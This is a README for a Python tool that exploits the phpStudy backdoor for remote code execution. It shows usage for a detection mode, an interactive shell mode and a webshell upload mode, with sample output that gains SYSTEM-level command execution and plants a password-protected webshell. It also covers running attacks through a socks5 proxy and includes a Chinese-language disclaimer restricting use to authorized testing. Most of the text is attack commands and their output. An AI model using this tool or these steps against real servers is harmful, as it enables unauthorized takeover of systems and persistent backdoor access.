# phpstudy-backdoor-rce
phpstudy_rce exp &amp; poc
> phpstudy backdoor rce exp &amp; poc

- usage:
```python
python phpstudy_rce.py                                   
usage: python phpstudy_rce.py -u [url] --shell

PHPstudy RCE POC & EXP

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     指定目标url地址
  --shell               利用漏洞并获取命令行
  --webshell            利用漏洞并上传webshell
  -p PROXY, --proxy PROXY
                        设置代理，如socks5://127.0.0.1:7890

```

- example:
```python
# poc
python phpstudy_rce.py -u http://xxxx/           
[✅]存在漏洞

# exp - 获取shell
python phpstudy_rce.py -u http://xxxx/ --shell       
[✅]存在漏洞
cmd>>> whoami
nt authority\system
cmd>>> net user
User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed with one or more errors.

cmd>>> exit

# exp - 写入webshell
python phpstudy_rce.py -u http://xxxx/ --webshell
[✅]存在漏洞
[✅]获取到网站路径 C:/phpStudy/WWW/
[✅]写入webshell成功 http://xxxx/conf.php 连接密码 x

# proxy
python phpstudy_rce.py -u http://xxxx/ -p socks5://127.0.0.1:7890
python phpstudy_rce.py -u http://xxxx/ --shell -p socks5://127.0.0.1:7890
python phpstudy_rce.py -u http://xxxx/ --webshell -p socks5://127.0.0.1:7890
```

- 参考链接
  - https://github.com/theLSA/phpstudy-backdoor-rce
  - https://blog.csdn.net/qq_45521281/article/details/105926151
  
- 使用须知
  - 本工具仅面向合法授权的企业安全建设行为，在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。
  - 如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果。
 

## Stargazers over time

[![Stargazers over time](https://starchart.cc/whitzard-ai/jade-db.svg)](https://starchart.cc/whitzard-ai/jade-db)

